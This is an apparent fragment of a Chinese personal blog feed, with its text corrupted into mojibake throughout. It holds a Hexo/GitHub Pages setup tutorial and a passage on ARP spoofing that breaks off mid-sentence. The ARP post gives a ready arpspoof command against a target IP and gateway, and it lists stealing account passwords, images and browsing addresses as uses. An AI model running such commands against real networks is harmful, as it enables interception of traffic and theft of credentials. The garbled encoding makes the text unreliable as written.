title="node.jså®‰è£…"></a>node.jså®‰è£…</h4><p>é¦–å…ˆéœ€è¦ç»™ç”µè„‘å®‰è£…ä¸€ä¸ªnode.js</p><p><a href="https://nodejs.org/en/download/">ä¸‹è½½é“¾æ¥</a></p><p>æˆ‘å½“æ—¶è¿˜æ²¡æœ‰è®°ç¬”è®°çš„ä¹ æƒ¯æ‰€ä»¥nodeä¸‹è½½å’Œé…ç½®è¿™é‡Œæ²¡æœ‰ç¬”è®°</p><p>å¯ä»¥çœ‹çœ‹èœé¸Ÿæ•™ç¨‹è®²çš„å¾ˆè¯¦ç»†äº†</p><p><a href="https://www.runoob.com/nodejs/nodejs-install-setup.html">Node.js å®‰è£…é…ç½® | èœé¸Ÿæ•™ç¨‹ (runoob.com)</a></p><h4 id="æ¢æº"><a href="#æ¢æº" class="headerlink" title="æ¢æº"></a>æ¢æº</h4><p>ç»™node.jsæ¢ä¸€ä¸ªæ·˜å®é•œåƒï¼Œä¸ç„¶æ¥ä¸‹æ¥ä¸‹è½½hexoä¼štimeoutã€‚</p><p>ç›´æ¥æ‰“å¼€power shellè¾“å…¥ä»¥ä¸‹å‘½ä»¤ï¼š</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm config <span class="hljs-built_in">set</span> registry https://registry.npm.taobao.org<br></code></pre></td></tr></table></figure><p>æ—¶é—´ä¼šæ¯”è¾ƒé•¿å¯ä»¥ä¸‹æ¥¼è·‘ä¸ªä¸¤å…¬é‡Œ</p><h4 id="Hexoå®‰è£…"><a href="#Hexoå®‰è£…" class="headerlink" title="Hexoå®‰è£…"></a>Hexoå®‰è£…</h4><p>powershellè¾“å…¥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">npm install <span class="hljs-literal">-g</span> hexo<span class="hljs-literal">-cli</span><br></code></pre></td></tr></table></figure><p>æ¢æºä»¥åä¸‹è½½é€Ÿåº¦è´¼å¿«</p><h4 id="è¸©å‘"><a href="#è¸©å‘" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h4><p>ï¼ˆæ¥ä¸‹æ¥æ˜¯ä¸é‡è¦çš„ç¢ç¢å¿µå¯ä»¥ç›´æ¥è·³è¿‡çœ‹ä¸‹ä¸€è¶´ï¼‰</p><p>æœ€å¼€å§‹çœ‹çš„æ•™ç¨‹è¯´è¦ä¿®æ”¹ç¯å¢ƒå˜é‡ï¼Œä¿®æ”¹äº†å¤§åŠå¤©ã€‚æ‰§è¡Œnpm installçš„æ—¶å€™ä¸€ç›´æŠ¥é”™ï¼Œä¸€æ°”ä¹‹ä¸‹æŠŠnodeæ‰€æœ‰æ–‡ä»¶éƒ½åˆ äº†ï¼Œé‡æ–°ä¸‹è½½ã€‚</p><p><del>(åˆ«å­¦æˆ‘ï¼Œé‡åˆ°æŠ¥é”™è¦æ‰¾é—®é¢˜åŸå› è€Œä¸æ˜¯é€ƒé¿)</del></p><blockquote><p>å¤§åŠå¤œä¸‹è½½ä¸åŠ¨å¯»æ±‚å·å¸ˆå‚…å¸®å¿™ï¼Œå·å‘ç°æˆ‘çš„ä»£ç†åœ°å€æ²¡æ›´æ–°ï¼Œç‹ ç‹ æ‹–åè…¿ã€‚ğŸ¥²</p></blockquote><p>é‡æ–°ä¸‹è½½ä¹‹åä¿æŒè‡ªåŠ¨é…ç½®çš„ç¯å¢ƒå˜é‡ä¸å˜ï¼Œåœ¨å‘½ä»¤è¡Œé‡Œç›´æ¥npm installå‘ç°è¿˜æ˜¯æŠ¥ä»¥å‰ä¸€æ ·çš„é”™ã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-01-33.png"></p><p>å¤åˆ¶ç™¾åº¦å‘ç°æ˜¯æƒé™ä¸å¤Ÿï¼Œè¦ç”¨ç®¡ç†å‘˜æ–¹å¼æ‰§è¡Œå‘½ä»¤ã€‚</p><blockquote><p>æ‰€ä»¥æˆ‘ç™½åˆ äº†å‘—ï¼ï¼</p></blockquote><p>win+Ræ‰“å¼€ç®¡ç†å‘˜æ–¹å¼ç»ˆç«¯ï¼Œå†æ¬¡è¾“å…¥æ˜¾ç¤ºtimeoutã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_10-59-37.png"></p><p>åˆç™¾åº¦å‘ç°éœ€è¦æ¢æºã€‚</p><p>ç›´æ¥ä»ç½‘ä¸Šæ‰¾äº†ä¸ªç°æˆçš„æ·˜å®æºï¼Œæ¢å¥½ä»¥åå†installäº”ç§’æˆåŠŸã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-02-39.png"></p><h2 id="Hexoçš„ç½‘é¡µé…ç½®"><a href="#Hexoçš„ç½‘é¡µé…ç½®" class="headerlink" title="Hexoçš„ç½‘é¡µé…ç½®"></a>Hexoçš„ç½‘é¡µé…ç½®</h2><p>ä¸‹è½½åè¾“å…¥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">hexo init blog<br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤å°±æ˜¯åœ¨powershellå½“å‰çš„æ ¹ç›®å½•ä¸‹æ–°å»ºä¸€ä¸ªåä¸ºblogçš„æ–‡ä»¶å¤¹ï¼Œç”¨äºåç»­é…ç½®æ–‡ä»¶çš„å­˜æ”¾ã€‚</p><p>[<em>blog</em>]å¥½åƒå¯ä»¥å¡«åˆ«çš„æ–‡ä»¶åï¼Œä½†æˆ‘æ²¡è¯•è¿‡æ‰€ä»¥ä¸å»ºè®®ã€‚</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>å»ºå¥½æ–‡ä»¶å¤¹ä¹‹ååˆå§‹åŒ–é…ç½®</p><figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm">cd <span class="hljs-keyword">blog </span>  <span class="hljs-comment">#è¿›å…¥blogæ–‡ä»¶å¤¹</span><br>npm <span class="hljs-keyword">install </span>   <br></code></pre></td></tr></table></figure><p>è¿™ä¸ªå‘½ä»¤ç»“æŸä»¥åå°±å¯ä»¥çœ‹åˆ°blogæ–‡ä»¶å¤¹é‡Œæœ‰å¾ˆå¤šæ–‡ä»¶å–½ï¼Œç±»ä¼¼äºä¸‹å›¾è¿™æ ·ã€‚</p><p>å›¾ç‰‡é‡Œæœ‰äº›æ–‡ä»¶ä½ æ²¡æœ‰ä¹Ÿæ²¡å…³ç³»ï¼Œå› ä¸ºè¿™æ˜¯æˆ‘å»ºæˆåšå®¢åˆä¸‹è½½äº†å¾ˆå¤šä¸œè¥¿ä¹‹åè¡¥æˆªçš„å›¾ã€‚ğŸ˜³</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-01-30.png"></p><p>ä¸¤æ¡å‘½ä»¤ç”Ÿæˆç½‘é¡µ</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">hexo generate<br>hexo server<br></code></pre></td></tr></table></figure><p>å½“ç„¶å–½hexoå–„è§£äººæ„åœ°æ”¯æŒç®€å†™ï¼Œå¯ä»¥ç›´æ¥è¾“å…¥ <code>hexo g</code>å’Œ<code>hexo s</code></p><p>ç”¨æµè§ˆå™¨é¢„è§ˆç½‘å€<a href="http://localhost:4000/">http://localhost:4000</a></p><p>å› ä¸ºæˆ‘ä»¬è¿˜æ²¡é…ç½®GitHubæ‰€ä»¥è¿™ä¸ªæ—¶å€™å°±æ˜¯Hexoæœ€åŸºç¡€çš„ä¸‘é™‹é¡µé¢ã€‚</p><h4 id="è¸©å‘-1"><a href="#è¸©å‘-1" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h4><p>cmdé‡Œè¾“å…¥hexoå‘½ä»¤ååˆæŠ¥é”™</p><p>è¯´hexoä¸æ˜¯å¯ä»¥æ‰§è¡Œçš„å‘½ä»¤ï¼Œç™¾åº¦åå‘ç°æ˜¯ç¯å¢ƒå˜é‡çš„é—®é¢˜ï¼Œ<del>è¯¥æ­»çš„ç¯å¢ƒå˜é‡</del></p><p>å‘ç°hexo-cliçš„binç›®å½•ä¸‹æ²¡æœ‰.cmdçš„æ–‡ä»¶ï¼Œä½†æ˜¯å‰ä¸€ä¸ªç›®å½•é‡Œæœ‰ï¼Œå°±ç›´æ¥å¤åˆ¶è¿‡æ¥ï¼ŒåˆæŠŠbinæ·»åŠ åˆ°äº†ç¯å¢ƒå˜é‡é‡Œï¼Œå†hexo init</p><p>è¿è¡ŒæˆåŠŸä½†æŠ¥é”™ï¼Œ<del>æƒ³æ­»</del></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_12-29-06.png"></p><p>æ®è¯´æ˜¯å› ä¸ºç›®å½•ä¸‹æ²¡æœ‰è¿™ä¸ªæ–‡ä»¶å¤¹ï¼Œ<del>ä¸ºä»€ä¹ˆåº”è¯¥æœ‰hexoçš„æ–‡ä»¶å¤¹å•Š</del></p><p>æ¢ä¸ªæ€è·¯ï¼Œç”¨ç®¡ç†å‘˜æ¨¡å¼é‡æ–°ä¸‹è½½hexoï¼ˆæˆ‘å°±ä¸ªé‡åˆ°å›°éš¾å¸è½½åˆ é™¤çš„èœé¸¡ğŸ˜¶â€ğŸŒ«ï¸</p><p>ä¸‹è½½åè¿è¡Œ<code>hexo init blog</code></p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-24-15.png"></p><p>åˆä¸€æ¬¡å‘ä¸‡èƒ½çš„äº’è”ç½‘æ±‚åŠ©ï¼Œä¿®æ”¹äº†ä¸€ä¸‹power shellçš„æƒé™ï¼Œå†è¿è¡Œ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_20-25-14.png"></p><p>æˆåŠŸï¼ˆï¼Ÿï¼Ÿï¼‰</p><blockquote><p>ç®¡ç†å‘˜æ¨¡å¼yyds</p></blockquote><h2 id="GitHubé…ç½®ç½‘é¡µ"><a href="#GitHubé…ç½®ç½‘é¡µ" class="headerlink" title="GitHubé…ç½®ç½‘é¡µ"></a>GitHubé…ç½®ç½‘é¡µ</h2><p>åœ¨GitHubé‡Œå»ºä¸€ä¸ª<strong>ç”¨æˆ·å.github.io</strong>çš„ä»“åº“ï¼Œå»ºå¥½ä»¥åç‚¹å‡»pageæŠŠè¿™ä¸ªåº“å˜æˆä¸€ä¸ªç½‘é¡µã€‚</p><p>æˆ‘ä»¬åœ¨å‘½ä»¤è¡Œè¾“å…¥<code>hexo d</code> æ—¶é»˜è®¤ä¸Šä¼ <strong>master</strong>åˆ†æ”¯ï¼Œä½†æ˜¯åœ¨GitHubé¡µé¢é»˜è®¤<strong>main</strong>åˆ†æ”¯ï¼Œéœ€è¦æ”¹æˆmasterã€‚æ²¡æœ‰ä¸‹æ‹‰é€‰é¡¹ï¼Œè¦æ‰‹åŠ¨è¾“å…¥</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-03-13_21-16-37.png"></p><p>ä½†æ˜¯è¿™ä¸ªæ—¶å€™å…ˆåˆ«hexo dï¼Œä¼šæŠ¥é”™ï¼Œå› ä¸ºè¿˜æ²¡è¿æ¥GitHubå’Œhexoã€‚</p><p>è¿™æ—¶å€™ä½ åœ¨æµè§ˆå™¨æœç´¢<code>https://ç”¨æˆ·å.github.io</code>ï¼Œå‡ºç°ä»“åº“çš„è‡ªè¿°æ–‡ä»¶å°±æ˜¯æˆåŠŸå•¦ã€‚</p><h2 id="SSHè¿æ¥GitHub"><a href="#SSHè¿æ¥GitHub" class="headerlink" title="SSHè¿æ¥GitHub"></a>SSHè¿æ¥GitHub</h2><p>ä¹Ÿæ˜¯é»˜è®¤å¤§å®¶æœ‰è¿™ç©æ„çš„å“ˆ</p><p>åœ¨gité‡Œé¢è¾“å…¥</p><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs powershell">ssh<span class="hljs-literal">-keygen</span> <span class="hljs-literal">-t</span> rsa <span class="hljs-literal">-C</span> <span class="hljs-string">&quot;[your_email@example.com]&quot;</span><br></code></pre></td></tr></table></figure><p>æŒ‰å›è½¦ä¹‹åä¼šæç¤ºè¾“å…¥å†…å®¹ï¼Œå¯ä»¥å…¨éƒ¨æŒ‰å›è½¦ï¼Œè¡¨ç¤ºä½¿ç”¨é»˜è®¤çš„<code>~/.ssh</code>æ–‡ä»¶ç›®å½•å­˜æ”¾å¯†é’¥ï¼Œä»¥åŠä¸è®¾ç½®å¯†é’¥çš„å¯†ç ã€‚</p><p>åœ¨æ–‡ä»¶å¤¹é‡Œæ‰¾åˆ°.sshæ–‡ä»¶ï¼Œæ‰¾åˆ°é‡Œé¢çš„å¯†é’¥å¤åˆ¶åˆ°GitHubã€‚åœ¨ä¸ªäººè®¾ç½®é¡µé¢çš„SSH and GPG keys æ·»åŠ </p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2023-02-20_23-36-59.png"></p><p>å†æ‰“å¼€gitè¾“å…¥è¿æ¥å‘½ä»¤</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_11-42-49.png"></p><h2 id="Hexoå†…éƒ¨æ“ä½œ"><a href="#Hexoå†…éƒ¨æ“ä½œ" class="headerlink" title="Hexoå†…éƒ¨æ“ä½œ"></a>Hexoå†…éƒ¨æ“ä½œ</h2><h3 id="å†™ä½œ"><a href="#å†™ä½œ" class="headerlink" title="å†™ä½œ"></a>å†™ä½œ</h3><p><strong>åœ¨blogæ–‡ä»¶å¤¹é‡Œæ“ä½œ</strong></p><p>åˆ›å»ºæ–°æ–‡ç« </p><figure class="highlight actionscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs actionscript">hexo <span class="hljs-keyword">new</span> <span class="hljs-string">&quot;æ–‡ç« æ ‡é¢˜&quot;</span><br></code></pre></td></tr></table></figure><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-05-20.png"></p><p>è¿˜ä¼šè´´å¿ƒçš„å‘Šè¯‰ä½ å»ºåœ¨å“ªé‡Œäº†</p><blockquote><p>å®ƒçœŸçš„ï¼Œæˆ‘å“­æ­»</p></blockquote><p>ä¹‹åå°±å¯ä»¥åœ¨è¿™ä¸ªæ–‡ä»¶å¤¹é‡Œçœ‹åˆ°ä»¥â€œæ–‡ç« æ ‡é¢˜â€å‘½åçš„mdæ–‡ä»¶ï¼Œåœ¨é‡Œé¢ä¿®æ”¹ä¹‹åå†è¿è¡Œ<code>hexo g</code>å’Œ<code>hexo s</code>å°±èƒ½åœ¨é¢„è§ˆç½‘é¡µçœ‹åˆ°åˆšå‘çš„æ–‡æ¡£å•¦ã€‚</p><blockquote><p>è¿™ä¸€è¶´æ— è„‘è·Ÿæ•™ç¨‹èµ°æ²¡è¸©é›·ï¼Œæˆ‘åˆæ´»äº†ğŸ¥³</p></blockquote><h5 id="é…ç½®ç¯èŠ‚"><a href="#é…ç½®ç¯èŠ‚" class="headerlink" title="é…ç½®ç¯èŠ‚"></a>é…ç½®ç¯èŠ‚</h5><p>é…ç½®æ–‡ä»¶[-config.yml]</p><p><code>title</code>ä¿®æ”¹ç½‘é¡µå¯¼èˆªæ æ ‡ç­¾</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-17-41.png"></p><p>è®©ç½‘é¡µå’ŒGitHubè”å§»</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p><code>theme</code>æ”¹ä¸»é¢˜ï¼Œç›´æ¥å¤åˆ¶ä¸»é¢˜åå­—å°±å¥½</p><h4 id="è¸©å‘-2"><a href="#è¸©å‘-2" class="headerlink" title="è¸©å‘"></a>è¸©å‘</h4><p><code>hexo d</code>æŠŠå†™ä½œéƒ¨ç½²åˆ°GitHubä¸Šï¼ŒåˆæŠ¥é”™å•¦å“ˆå“ˆå“ˆ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-30-22.png"></p><p>ä¸‡èƒ½çš„äº’è”ç½‘è¯´è¿™ä¸ªå«æ˜ å°„æ¡ç›®ç¼©è¿›é”™è¯¯ï¼Œæ”¹äº†å¥½å‡ éç¼©è¿›éƒ½ä¸å¯¹</p><p>è¿˜ç¢°åˆ°äº†ä¸€ä¸ªé”™è¯¯</p><blockquote><p>(101.1)é”™è¯¯çš„æ„æ€æ˜¯ç¬¬101è¡Œä¸å‰æ–‡é‡å¤ï¼ŒæŠŠè¿™ä¸€è¡Œæ³¨é‡Šæ‰å°±è¡Œ</p></blockquote><p>æœ€åæ”¹æˆè¿™æ ·è¿è¡ŒæˆåŠŸ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-08_21-49-15.png"></p><p>ä½†æ˜¯æŸ¥çœ‹<a href="https://shmodifier.github.ioè¿˜æ˜¯ä¸æˆåŠŸ/">https://ShModifier.github.ioè¿˜æ˜¯ä¸æˆåŠŸ</a></p><p>åæ¥å‘ç°æˆ‘è¿™èªæ˜çš„å°è„‘ç“œæŠŠä¿¡æ¯æ”¾é”™äº†ä½ç½®ğŸƒ</p><p><img src="/img/%E4%B8%80%E8%B5%B7%E6%9D%A5%E6%90%AD%E5%8D%9A%E5%AE%A2/Snipaste_2022-12-09_21-03-45.png"></p><p>æ”¹æˆè¿™æ ·å°±å¥½å•¦</p><hr><p>æŠŠæ­åšå®¢çš„ç¬”è®°å‘ä¸Šæ¥ï¼Œç»™å¤§å®¶çœ‹çœ‹ç¬‘è¯â˜ƒï¸</p>]]></content>
    
    
    <categories>
      
      <category>è¸©å‘</category>
      
    </categories>
    
    
    <tags>
      
      <tag>hexo</tag>
      
      <tag>GitHub</tag>
      
      <tag>Node</tag>
      
      <tag>Git</tag>
      
      <tag>ssh</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>å…³äºARPæ¬ºéª—å’ŒARPæ”»å‡»</title>
    <link href="/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/"/>
    <url>/2023/01/05/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/</url>
    
    <content type="html"><![CDATA[<p>è¶ç€å¯’å‡å·å·å·å“ˆå“ˆå“ˆğŸ¤ª</p><span id="more"></span><h3 id="ARPåè®®"><a href="#ARPåè®®" class="headerlink" title="ARPåè®®"></a>ARPåè®®</h3><p>åœ°å€è§£æåè®®ï¼Œå³ARPï¼ˆAddress Resolution Protocolï¼‰ï¼Œæ˜¯æ ¹æ®IPåœ°å€è·å–ç‰©ç†åœ°å€çš„ä¸€ä¸ªTCP&#x2F;IPåè®®ã€‚</p><blockquote><p>æ¯ä¸€å°ä¸»æœºéƒ½æœ‰ä¸€ä¸ªarpé«˜é€Ÿç¼“å­˜ï¼Œé‡Œé¢æœ‰æœ¬å±€åŸŸç½‘ä¸­çš„å„ä¸»æœºå’Œè·¯ç”±å™¨çš„IPåœ°å€åˆ°ç¡¬ä»¶åœ°å€çš„æ˜ å°„è¡¨</p></blockquote><h4 id="å·¥ä½œæµç¨‹"><a href="#å·¥ä½œæµç¨‹" class="headerlink" title="å·¥ä½œæµç¨‹"></a>å·¥ä½œæµç¨‹</h4><p>ä¸»æœºAå’Œä¸»æœºBå„è‡ªæœ‰è‡ªå·±çš„IPåœ°å€å’ŒMACåœ°å€ï¼Œåœ¨ä¸»æœºAä¸ä¸»æœºBé€šä¿¡æ—¶ï¼ŒARPåè®®å¯å°†ä¸»æœºBçš„IPåœ°å€è§£æä¸ºMACåœ°å€ã€‚</p><p>ç¬¬ä¸€æ­¥ï¼š</p><p>ä¸»æœºAé¦–å…ˆç¡®å®šç”¨äºè®¿é—®ä¸»æœºBçš„IPåœ°å€ï¼Œç„¶åä¸»æœºAåœ¨è‡ªå·±çš„æœ¬åœ°ARPç¼“å­˜ä¸­æ£€æŸ¥ä¸»æœºBçš„IPåœ°å€åŒ¹é…çš„MACåœ°å€</p><p>ç¬¬äºŒæ­¥ï¼š</p><p>å¦‚æœä¸»æœºAåœ¨ARPç¼“å­˜ä¸­æ²¡æœ‰æ‰¾åˆ°ä¸»æœºBçš„IPæ˜ å°„ï¼Œå®ƒå°†è¯¢é—®ä¸»æœºBå¯¹åº”çš„ç¡¬ä»¶åœ°å€ï¼Œä¼šå°†ARPè¯·æ±‚å¸§å¹¿æ’­åˆ°æœ¬åœ°ç½‘ç»œä¸Šçš„æ‰€æœ‰ä¸»æœºï¼Œä¸»æœºAçš„IPåœ°å€å’ŒMACåœ°å€éƒ½åŒ…æ‹¬åœ¨ARPè¯·æ±‚ä¸­ã€‚æœ¬åœ°ç½‘ç»œä¸Šçš„æ¯å°ä¸»æœºéƒ½æ¥å—åˆ°ARPè¯·æ±‚å¹¶æ£€æŸ¥æ˜¯å¦ä¸è‡ªå·±çš„IPåœ°å€åŒ¹é…ã€‚å¦‚æœä¸»æœºå‘ç°è¯·æ±‚çš„IPåœ°å€ä»¥è‡ªå·±çš„IPåœ°å€ä¸åŒ¹é…ï¼Œä»–å°†ä¸¢å¼ƒARPè¯·æ±‚ã€‚</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP1.png"></p><p>ç¬¬ä¸‰æ­¥ï¼š</p><p>ä¸»æœºBç¡®å®šAARPè¯·æ±‚ä¸­çš„IPåœ°å€äºè‡ªå·±çš„IPåœ°å€åŒ¹é…ï¼Œå¹¶å°†ä¸»æœºAçš„IPåœ°å€å’ŒMACåœ°å€æ˜ å°„æ·»åŠ åˆ°æœ¬åœ°ARPç¼“å­˜ä¸­ã€‚</p><p>ç¬¬å››æ­¥ï¼š</p><p>ä¸»æœºBå°†åŒ…å«MACåœ°å€çš„ARPå›å¤æ¶ˆæ¯ç›´æ¥å‘é€åˆ°ä¸»æœºA</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/ARP2.png"></p><p>ç¬¬äº”æ­¥ï¼š</p><p>å½“ä¸»æœºAæ”¶åˆ°ä»ä¸»æœºBå‘æ¥çš„ARPå›å¤æ¶ˆæ¯æ—¶ï¼Œä¼šä½¿ç”¨ä¸»æœºBçš„IPåœ°å€å’ŒMACåœ°å€æ˜ å°„æ›´æ–°ARPç¼“å­˜ã€‚æœ¬æœºç¼“å­˜æ˜¯æœ‰ç”Ÿå­˜æœŸçš„ï¼Œç”Ÿå­˜æœŸç»“æŸï¼Œå°†å†æ¬¡é‡å¤ä¸Šé¢çš„å†…å®¹ã€‚ä¸»æœºBçš„MACåœ°å€ä¸€æ—¦ç¡®å®šï¼Œä¸»æœºAå°±èƒ½å‘ä¸»æœºBå‘é€IPé€šä¿¡äº†ã€‚</p><h4 id="å‘½ä»¤çª—å£ç©è½¬ARP"><a href="#å‘½ä»¤çª—å£ç©è½¬ARP" class="headerlink" title="å‘½ä»¤çª—å£ç©è½¬ARP"></a>å‘½ä»¤çª—å£ç©è½¬ARP</h4><p>è¾“å…¥<code>arp</code>æç¤ºä½¿ç”¨æ–¹æ³•</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-08-45.png"></p><blockquote><p>è¿™é‡Œä¸€å¼€å§‹æ€»æ˜¯è¯´â€œâ€™ARPâ€™ä¸æ˜¯å¯æ‰§è¡Œçš„ç¨‹åºâ€ï¼Œå‡­æˆ‘è¸©å‘ç»éªŒçŸ¥é“è¿™æ˜¯ç¯å¢ƒå˜é‡çš„é—®é¢˜ã€‚è´¹å°½åƒè¾›ä¸‡è‹¦å‘ç°æ˜¯å› ä¸ºæˆ‘çš„ç¯å¢ƒå˜é‡é‡Œå±…ç„¶æ²¡æœ‰system32ğŸ¥²ã€‚ä½†æ˜¯è¾“å…¥pathæŸ¥çœ‹æ˜¯æœ‰å®ƒçš„ï¼Œä¸çŸ¥é“å“ªé‡Œå‡ºäº†é—®é¢˜ï¼ŒåŠ ä¸Šä¹‹åé‡å¯å°±å¥½å•¦</p></blockquote><p>è¾“å…¥<code>arp -a</code>æŸ¥çœ‹ARPç¼“å­˜è¡¨ä¿¡æ¯</p><p><img src="/img/%E5%85%B3%E4%BA%8EARP%E6%AC%BA%E9%AA%97%E5%92%8CARP%E6%94%BB%E5%87%BB/Snipaste_2023-01-04_18-09-19.jpg"></p><p><strong>é™æ€</strong>åœ°å€å³ä¸»æœºè‡ªå·±é…ç½®ç”Ÿæˆçš„åœ°å€ã€‚</p><p>å½“ä¸»æœºæ–°è¿æ¥å…¥ä¸€å°è®¾å¤‡ï¼Œå¹¶ä¸”ä¸ä¸»æœºäº§ç”Ÿé€šä¿¡åï¼Œaqpè¡¨ä¼šæ›´æ–°ä¸€æ¡<strong>åŠ¨æ€</strong>åœ°å€ã€‚</p><h3 id="ARPæ”»å‡»"><a href="#ARPæ”»å‡»" class="headerlink" title="ARPæ”»å‡»"></a>ARPæ”»å‡»</h3><p>ARPæ”»å‡»å°±æ˜¯é€šè¿‡ä¼ªé€ IPåœ°å€å’ŒMACåœ°å€çš„å¯¹åº”å…³ç³»ï¼Œä½¿å¾—ç½‘ç»œæ— æ³•æ­£å¸¸é€šä¿¡ã€‚å³ä¿®æ”¹é¶æœºçš„IPåœ°å€å’ŒMACåœ°å€ï¼Œä½¿å…¶ä»–è®¾å¤‡ä¸é¶æœºçš„é€šä¿¡æ— æ³•æ­£å¸¸è¿›è¡Œï¼Œè¿›è€Œæˆªæ–­é¶æœºæµé‡ã€‚</p><blockquote><p>å¯ä»¥ç›´æ¥ä½¿ç”¨arpspoofæ’ä»¶æ”»å‡»</p></blockquote><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs css">sudo arpspoof -<span class="hljs-selector-tag">i</span> eth0  -t <span class="hljs-selector-attr">[ç›®æ ‡IP]</span> -r <span class="hljs-selector-attr">[ç½‘å…³]</span><br></code></pre></td></tr></table></figure><p>è¿™é‡Œâ€râ€çš„ç”¨æ³•æ²¡ææ‡‚ğŸ˜£å¥½åƒå°±æ˜¯ç›´æ¥åŒå‘æ”»å‡»</p><p>Ctrl+Cæˆ–å…³é—­ç»ˆç«¯å³åœæ­¢æ”»å‡»</p><h3 id="ARPæ¬ºéª—"><a href="#ARPæ¬ºéª—" class="headerlink" title="ARPæ¬ºéª—"></a>ARPæ¬ºéª—</h3><p><del>å¬è¯´ARPæ¬ºéª—é…åˆDNSæ¬ºéª—æ•ˆæœæ›´ä½³</del>ğŸ¤¨</p><h5 id="å¯ä»¥ç”¨æ¥å¹²çš„åäº‹"><a href="#å¯ä»¥ç”¨æ¥å¹²çš„åäº‹" class="headerlink" title="å¯ä»¥ç”¨æ¥å¹²çš„åäº‹"></a>å¯ä»¥ç”¨æ¥å¹²çš„åäº‹</h5><ul><li>è·å–æµè§ˆå›¾ç‰‡</li><li>è·å–é¶æœºå„å¹³å°è¾“å…¥çš„è´¦å·å¯†ç </li><li>è·å–æµè§ˆåœ°å€</li></ul><h5 id="è¡Œéª—æ–¹æ³•"><a href="#è¡Œéª—æ–¹æ³•" class="headerlink" title="è¡Œéª—æ–¹æ³•"></a>è¡Œéª—æ–¹æ³•</h5><h6 id="1-ä¼ªè£…æˆç½‘å…³"><a href="#1-ä¼ªè£…æˆç½‘å…³" class="headerlink" title="1.ä¼ªè£…æˆç½‘å…³"></a>1.ä¼ªè£…æˆç½‘å…³</h6><p>æ¬ºéª—æºæŠŠè‡ªå·±ä¼ªè£…æˆç½‘å…³ï¼Œå‘å±€åŸŸç½‘å†…çš„ç›®æ 